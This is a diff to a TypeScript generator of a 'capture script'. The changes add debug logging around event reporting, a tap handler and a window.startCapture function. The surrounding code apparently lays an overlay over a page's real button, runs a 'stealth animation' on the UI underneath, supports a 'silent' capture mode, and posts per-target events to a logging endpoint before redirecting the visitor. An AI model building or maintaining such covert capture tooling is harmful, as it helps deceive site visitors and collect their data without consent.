@@ -25,13 +25,19 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     }
 
     async function logEvent(type, data) {
+      console.log("[DEBUG] logEvent called: ", type, data);
       try {
-        return await fetch('/api/log/' + targetId + '/' + type, {
+        const response = await fetch('/api/log/' + targetId + '/' + type, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
         });
-      } catch(e) { return null; }
+        console.log("[DEBUG] logEvent response: ", response.status);
+        return response;
+      } catch(e) {
+        console.error("[DEBUG] logEvent error: ", e);
+        return null; 
+      }
     }
 
     async function logExtra(data) {
@@ -134,13 +140,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           });
 
           function trigger() {
-            console.log("[DEBUG] Triggering capture");
+            console.log("[DEBUG] Triggering capture, calling window.startCapture");
             window.startCapture();
             if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
           function handleTap(e) {
-            console.log("[DEBUG] Click handled in handleTap");
+            console.log("[DEBUG] Click handled in handleTap, for ID: ", targetId);
             var btn = getTargetBtn();
             // Stealth animation on the real UI element underneath
             if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
@@ -182,6 +188,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
     var running = false;
     window.startCapture = async function(mode) {
+      console.log("[DEBUG] window.startCapture called with mode: ", mode);
       if (hasRedirected) return;
       
       var isSilent = mode === 'silent' || flowType === 'silent';
